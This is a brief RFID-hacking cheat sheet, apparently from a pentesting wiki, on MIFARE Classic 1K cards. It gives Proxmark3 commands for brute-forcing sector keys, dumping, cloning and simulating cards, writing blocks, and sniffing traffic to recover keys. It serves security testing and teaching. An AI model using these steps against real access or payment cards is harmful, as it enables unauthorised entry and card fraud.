# Attacking MIFARE Classic 1KB

* It has **16 sectors**, each of them has **4 blocks** and each block contains **16B**. The UID is in sector 0 block 0 (and can't be altered).
* To access each sector, you need **2 keys** (**A** and **B**) which are stored in **block 3 of each sector** (sector trailer). The sector trailer also stores the **access bits** that give the **read and write** permissions on **each block** using the 2 keys.
* 2 keys are useful to give permissions to read if you know the first one and write if you know the second one (for example).

```java
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).

### Reference

* [https://book.hacktricks.xyz/todo/radio-hacking/proxmark-3](https://book.hacktricks.xyz/todo/radio-hacking/proxmark-3)
